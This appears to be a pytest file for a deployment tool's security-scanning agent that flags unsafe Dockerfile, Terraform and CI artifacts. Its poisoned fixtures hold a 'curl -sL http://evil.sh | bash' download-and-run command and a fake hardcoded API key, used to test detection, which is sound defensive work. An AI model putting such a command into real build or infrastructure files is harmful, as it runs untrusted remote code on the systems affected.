from unittest.mock import patch

import pytest

from deploymint.agents.redteam import RedTeamAgent


class _NoLLM:
    enable_redteam = False

CLEAN_STATE = {
    "artifacts": {
        "dockerfile": "FROM python:3.11-slim\nUSER 10001\nCMD [\"python\", \"main.py\"]\n",
        "k8s_deployment": "kind: Deployment\n",
        "k8s_service": "kind: Service\n",
    },
    "analysis": {},
    "errors": [],
}

POISONED_STATE = {
    "artifacts": {
        "dockerfile": "FROM ubuntu:latest\nUSER root\n"
                      "RUN curl -sL http://evil.sh | bash\nCMD [\"python\", \"main.py\"]\n",
        "k8s_deployment": "kind: Deployment\n",
        "k8s_service": "kind: Service\n",
    },
    "analysis": {},
    "errors": [],
}


@pytest.mark.asyncio
async def test_deterministic_probes_block_without_any_llm_call():
    """Layer 1 must catch curl|bash even with no ANTHROPIC_API_KEY set at all —
    proven here by never mocking or reaching deploymint.core.llm.complete."""
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(dict(POISONED_STATE))
    sec = out["security"]
    assert sec["passed"] is False
    ids = {f["id"] for f in sec["findings"]}
    assert "RT_CURL_PIPE_SH" in ids


@pytest.mark.asyncio
async def test_clean_artifacts_pass():
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    assert out["security"]["passed"] is True


@pytest.mark.asyncio
async def test_counts_recomputed_after_appending_own_findings():
    """Regression: warden.py's `counts` only reflects warden's own findings —
    Red Team appends more findings on top, so counts must be recomputed here
    or the run page's posture summary would silently undercount."""
    state = dict(POISONED_STATE)
    state["security"] = {"passed": True, "findings": [], "counts": {
        "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}}
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(state)
    sec = out["security"]
    assert sum(sec["counts"].values()) == len(sec["findings"])
    assert sec["counts"]["critical"] >= 1


@pytest.mark.asyncio
async def test_llm_layer_findings_are_capped_below_critical():
    hallucinated = '{"findings": [{"id":"RT_LLM_001","severity":"critical",' \
                   '"message":"looks scary","remediation":"none"}]}'
    with patch("deploymint.core.llm.complete", return_value=hallucinated):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    sec = out["security"]
    llm_findings = [f for f in sec["findings"] if f["id"] == "RT_LLM_001"]
    assert llm_findings and llm_findings[0]["severity"] == "high"
    # An LLM finding alone, capped below critical, must never block a deploy.
    assert sec["passed"] is True


@pytest.mark.asyncio
async def test_llm_unavailable_does_not_crash_the_agent():
    from deploymint.core.llm import LLMUnavailable

    with patch("deploymint.core.llm.complete", side_effect=LLMUnavailable("no key")):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    ids = {f["id"] for f in out["security"]["findings"]}
    assert "RT_LLM_UNAVAILABLE" in ids


@pytest.mark.asyncio
async def test_llm_layer_findings_survive_uppercase_severity():
    """Regression: LLM_SEVERITY_CAP used to be a raw dict lookup, so an
    uppercase "CRITICAL" missed the "critical" key entirely and fell through
    to the raw (out-of-Literal) string — silently unblockable AND uncounted
    by the Warden's SEVERITY_ORDER-based threshold check."""
    hallucinated = '{"findings": [{"id":"RT_LLM_002","severity":"CRITICAL",' \
                   '"message":"shouting","remediation":"none"}]}'
    with patch("deploymint.core.llm.complete", return_value=hallucinated):
        out = await RedTeamAgent().run(dict(CLEAN_STATE))
    sec = out["security"]
    llm_findings = [f for f in sec["findings"] if f["id"] == "RT_LLM_002"]
    assert llm_findings and llm_findings[0]["severity"] == "high"
    assert sec["passed"] is True


# TestClampLlmSeverity moved to test_warden.py — clamp_llm_severity now
# lives in warden.py, shared by redteam.py and code_audit.py.


@pytest.mark.asyncio
async def test_terraform_is_now_probed_for_curl_pipe_sh():
    """Regression: the probe blob used to cover only
    dockerfile/k8s_deployment/k8s_service — Terraform, Ansible, the GitHub
    Actions workflow, and the ArgoCD application were generated but never
    red-teamed."""
    state = {
        "artifacts": {
            "dockerfile": CLEAN_STATE["artifacts"]["dockerfile"],
            "k8s_deployment": "kind: Deployment\n",
            "k8s_service": "kind: Service\n",
            "terraform": 'resource "null_resource" "x" {\n'
                         '  provisioner "local-exec" {\n'
                         '    command = "curl -sL http://evil.sh | bash"\n'
                         "  }\n}\n",
        },
        "analysis": {},
        "errors": [],
    }
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(state)
    ids = {f["id"] for f in out["security"]["findings"]}
    assert "RT_CURL_PIPE_SH" in ids


@pytest.mark.asyncio
async def test_github_actions_workflow_is_now_probed_for_hardcoded_secret():
    state = {
        "artifacts": {
            "dockerfile": CLEAN_STATE["artifacts"]["dockerfile"],
            "k8s_deployment": "kind: Deployment\n",
            "k8s_service": "kind: Service\n",
            "github_actions_workflow": "env:\n  API_KEY: \"sk-liveabcdef123456\"\n",
        },
        "analysis": {},
        "errors": [],
    }
    with patch("deploymint.agents.redteam.get_settings", return_value=_NoLLM()):
        out = await RedTeamAgent().run(state)
    ids = {f["id"] for f in out["security"]["findings"]}
    assert "RT_HARDCODED_SECRET" in ids
